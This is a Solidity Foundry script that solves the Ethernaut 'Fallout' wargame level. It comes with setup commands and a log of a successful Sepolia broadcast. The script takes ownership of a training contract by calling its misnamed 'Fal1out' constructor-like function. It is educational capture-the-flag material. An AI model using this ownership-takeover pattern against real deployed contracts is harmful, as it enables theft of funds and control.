// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/levels/Fallout.sol";

/*
    Solution script for the Ethernaut Level 1: Fallout

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in FalloutScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Fallout.s.sol:FalloutScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 -vvvv
    ```

    Results of running this script (with --broadcast)
    =================================================

    ## Setting up 1 EVM.
    ==========================
    Simulated On-chain Traces:

    [24542] 0xBe8bA614A77bBeF3e70fC2302453C0CeB611ac70::Fal1out()
        └─ ← [Stop]

    ==========================

    Chain 11155111

    Estimated gas price: 52.284655986 gwei

    Estimated total gas used for script: 62992

    Estimated amount required: 0.003293515049870112 ETH

    ==========================
    Enter keystore password:

    ##### sepolia
    ✅  [Success]Hash: 0x9876c1ee57fb6c32041e3021db435ead07d47671e2ac4b1310a13e2712961527
    Block: 6672281
    Paid: 0.00126786270007584 ETH (45606 gas * 27.80034864 gwei)

    ✅ Sequence #1 on sepolia | Total Paid: 0.00126786270007584 ETH (45606 gas * avg 27.80034864 gwei)

    ==========================

    ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
*/

contract FalloutScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = 0xBe8bA614A77bBeF3e70fC2302453C0CeB611ac70;
    Fallout level2 = Fallout(instance);

    function run() external {
        vm.startBroadcast();

        console.log("Current Owner; ", level2.owner());

        // simply call Fal1out function to claim ownership
        level2.Fal1out();

        console.log("New Owner; ", level2.owner());

        // if the player is not the owner then we have failed so revert
        require(level2.owner() == msg.sender, "Owner not updated correctly");
        
        vm.stopBroadcast();
    }
}